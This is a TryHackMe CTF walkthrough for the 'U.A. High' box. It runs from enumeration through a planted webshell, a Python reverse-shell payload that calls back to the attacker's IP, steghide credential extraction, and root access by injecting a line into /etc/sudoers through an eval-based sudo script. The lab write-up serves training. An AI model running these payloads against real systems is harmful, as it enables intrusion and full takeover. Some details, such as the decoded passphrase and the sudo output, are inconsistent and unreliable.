@@ -1,0 +1,175 @@
+💥 TryHackMe — U.A. High (Easy)
+
+    Walkthrough by Digvijay Netke (netke)
+
+🧠 Context
+
+A brand new TryHackMe box dropped named "U.A. High". As an anime fan and aspiring hacker, I had to jump on it. Here's how I went from 0 to root, using webshells, steghide, and a vulnerable bash script.
+🔎 Initial Enumeration
+✅ Nmap Scan
+
+nmap -sC -sV -Pn -T4 -p- -oA uahigh 10.10.34.14
+
+🟢 Ports Open:
+
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    Apache/2.4.41 (Ubuntu)
+
+🌐 Web Recon
+
+Navigated to:
+
+http://10.10.34.14
+
+Saw a basic U.A. High web page.
+🔎 Fuzzed for Directories:
+
+ffuf -u http://10.10.34.14/assets/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+Found:
+
+    /assets/
+
+    /assets/index.php
+
+⚙️ Remote Code Execution
+
+Visited:
+
+http://10.10.34.14/assets/index.php
+
+Blank page. Looked suspicious.
+🧪 Tested for Web Shell:
+
+http://10.10.34.14/assets/index.php?cmd=whoami
+
+Boom 💥 — command injection confirmed.
+Output was base64 encoded → typical webshell behavior.
+
+Decoded base64 → got:
+
+www-data
+
+🪝 Reverse Shell
+🛠 Payload used:
+
+http://10.10.34.14/assets/index.php?cmd=python3+-c+"import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.17.63.152',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])"
+
+📞 Listener setup:
+
+nc -nvlp 1234
+
+Connected as:
+
+www-data@ip-10-10-34-14
+
+Shell obtained ✅
+📂 Looting for Credentials
+
+Enumerated /home, /opt, /var/www/html/assets, etc.
+🖼 Found:
+
+oneforall.jpg
+
+File looked broken — couldn’t open it properly.
+🧪 File Analysis & Steg
+🔍 Checked type:
+
+file oneforall.jpg
+
+→ data
+⚠️ Corrupted image — fixed using hexedit / MagicBytes tool:
+
+https://github.com/Haxrein/MagicBytes
+
+Image became viewable — anime-themed image (cool but sus...)
+🔐 Steghide
+
+Tried:
+
+steghide extract -sf oneforall.jpg
+
+Prompted for passphrase.
+💡 Found base64-encoded passphrase in Hidden_Content:
+
+QWxsbWlnaHRmb3JFdmVyISE=
+
+Decoded:
+
+AllmightforEver!!!
+
+✅ Extracted hidden content:
+
+steghide extract -sf oneforall.jpg -p "AllmightforEver!!!"
+
+Revealed:
+
+username: deku
+password: [REDACTED]
+
+🔑 SSH as Deku
+
+ssh deku@10.10.34.14
+
+Got user shell ✅
+
+cat user.txt
+
+🔼 Privilege Escalation — Deku's Rise
+🔍 Check Groups:
+
+id
+
+Found:
+
+deku belongs to sudo
+
+🔍 Check Sudo Permissions:
+
+sudo -l
+
+Output:
+
+(ALL) /opt/NewComponent/feedback.sh
+(root) NOPASSWD: ALL
+
+    ⚠️ I could run feedback.sh as root!
+
+💣 Vulnerable Script - feedback.sh
+
+#!/bin/bash
+read feedback
+eval "echo $feedback"
+
+Even with filters, it uses eval → easy RCE!
+🛠 Exploit: Rewrite Sudoers
+
+Ran:
+
+sudo /opt/NewComponent/feedback.sh
+
+Input:
+
+deku ALL=NOPASSWD:ALL >> /etc/sudoers
+
+Now deku has full sudo with no password.
+🧨 Escalated to Root:
+
+sudo su -
+
+🏁 Final Flag:
+
+cat /root/root.txt
+
+ROOTED ✅
+🧠 Summary
+Step	Action
+🔍	Enumerated open ports & found hidden web shell
+🐚	Gained RCE via /assets/index.php?cmd=
+📞	Sent reverse shell payload, got www-data
+🖼	Found broken JPG → extracted with steghide
+🔐	Used base64-encoded password: AllmightforEver!!!
+🔑	Got SSH creds for deku
+🔼	Used sudo-allowed feedback.sh with eval
+🧨	Injected to write to /etc/sudoers
+👑	Gained full root access via sudo su
